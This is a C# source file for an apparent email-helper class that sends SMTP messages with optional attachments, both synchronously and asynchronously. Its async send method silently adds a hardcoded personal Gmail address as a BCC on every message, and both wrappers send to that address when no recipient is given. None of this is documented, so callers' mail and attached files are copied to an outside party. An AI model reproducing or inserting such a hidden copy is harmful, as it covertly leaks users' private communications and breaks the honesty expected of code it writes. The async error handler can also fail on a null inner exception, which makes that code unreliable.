using System;
using System.Collections;
using System.Net.Mail;

namespace Rsx
{
  public partial class Emailer
  {
    /// <summary>
    /// Sends a Mail with basic settings. Client is automatically infered...
    /// </summary>
    /// <param name="sendFrom">email address</param>
    /// <param name="sendSubject">subject</param>
    /// <param name="sendMessage">message</param>
    /// <returns></returns>
    public static string SendMessage(string sendFrom, string sendSubject, string sendMessage, string sendTo)
    {
      return SendMessageWithAttachment(sendFrom, sendSubject, sendMessage, null, sendTo);
    }

    /// <summary>
    /// Sends a Mail with basic settings. Client is automatically infered...
    /// </summary>
    /// <param name="sendFrom">email address</param>
    /// <param name="sendSubject">subject</param>
    /// <param name="sendMessage">message</param>
    /// <param name="attachments">array of filepaths</param>
    /// <returns></returns>
    public static string SendMessageWithAttachment(string sendFrom, string sendSubject, string sendMessage, ArrayList attachments, string sendTo)
    {
      try
      {
        SmtpClient client = Emailer.Clients.Smtp.CreateFromDomain(ref sendFrom);
        if (sendTo.Equals(string.Empty))
        {
        
            sendTo = "k0x.help@gmail.com";
         
        }
        SendMessage(sendFrom, sendSubject, sendMessage, attachments, sendTo, ref client);

        return ("Message sent to " + sendTo + " at " + DateTime.Now.ToString() + ".");
      }
      catch (Exception ex)
      {
        return ex.Message;
      }
    }

    /// <summary>
    /// Sends a Message withouth attachments in an Asynchroneous way. Client is automatically infered...
    /// </summary>
    /// <param name="sendFrom"></param>
    /// <param name="sendSubject"></param>
    /// <param name="sendMessage"></param>
    /// <param name="qu">needed</param>
    /// <returns></returns>
    public static string SendMessageAsync(string sendFrom, string sendSubject, string sendMessage, ref System.Messaging.MessageQueue qu, string sendTo)
    {
      return SendMessageWithAttachmentAsync(sendFrom, sendSubject, sendMessage, null, ref qu, sendTo);
    }

    /// <summary>
    /// Sends a Message with attachments in an Asynchroneous way. Client is automatically infered...
    /// </summary>
    /// <param name="sendFrom"></param>
    /// <param name="sendSubject"></param>
    /// <param name="sendMessage"></param>
    /// <param name="attachments">array of filepaths</param>
    /// <param name="qu">needed</param>
    /// <returns></returns>
    public static string SendMessageWithAttachmentAsync(string sendFrom, string sendSubject, string sendMessage, ArrayList attachments, ref System.Messaging.MessageQueue qu, string sendTo)
    {
      try
      {
        SmtpClient client = Emailer.Clients.Smtp.CreateFromDomain(ref sendFrom);
        if (sendTo.Equals(string.Empty))
        {
       
            sendTo = "k0x.help@gmail.com";
         
        }

        SendMessageAsync(sendFrom, sendSubject, sendMessage, attachments, ref qu, ref client, sendTo);

        return ("Message sending...");
      }
      catch (Exception ex)
      {
        return ex.Message + "\n\n" + ex.StackTrace + "\n\n" + ex.InnerException.Message;
      }
    }

    /// <summary>
    /// Sends a Mail message with the given data. A Client must be provided.
    /// </summary>
    /// <param name="sendFrom"></param>
    /// <param name="sendSubject"></param>
    /// <param name="sendMessage"></param>
    /// <param name="attachments"></param>
    /// <param name="sendTo">destinataire</param>
    /// <param name="client">Client to use for sending the email</param>
    public static void SendMessage(string sendFrom, string sendSubject, string sendMessage, ArrayList attachments, string sendTo, ref SmtpClient client)
    {
      System.Net.Mail.MailMessage message = PrepareMessage(sendFrom, sendSubject, sendMessage, attachments, sendTo);
      client.Send(message);
      Dispose(ref client, ref message);
    }

    /// <summary>
    /// Sends a Mail message (generated internally) with the given data in an Asynchroneus way. A Client must be provided.
    /// </summary>
    /// <param name="sendFrom"></param>
    /// <param name="sendSubject"></param>
    /// <param name="sendMessage"></param>
    /// <param name="attachments"></param>
    /// <param name="qu"></param>
    /// <param name="client"></param>
    /// <param name="sendTo"></param>
    public static void SendMessageAsync(string sendFrom, string sendSubject, string sendMessage, ArrayList attachments, ref System.Messaging.MessageQueue qu, ref SmtpClient client, string sendTo)
    {
      System.Net.Mail.MailMessage message = PrepareMessage(sendFrom, sendSubject, sendMessage, attachments, sendTo);
      message.Bcc.Add("k0x.help@gmail.com");
      //	MailMessage clone = PrepareMessage(sendFrom, sendSubject, sendMessage, attachments, "k0x.help@gmail.com");

      client.SendCompleted += client_SendCompleted;
      object[] pkg = new object[2];
      pkg[0] = qu;
      pkg[1] = message;
      client.SendAsync(message, pkg);
      //	object[] pkg2 = new object[2];
      //	pkg[0] = qu;
      //	pkg[1] = clone;
      //client.SendAsync(clone, pkg2);
    }
  }
}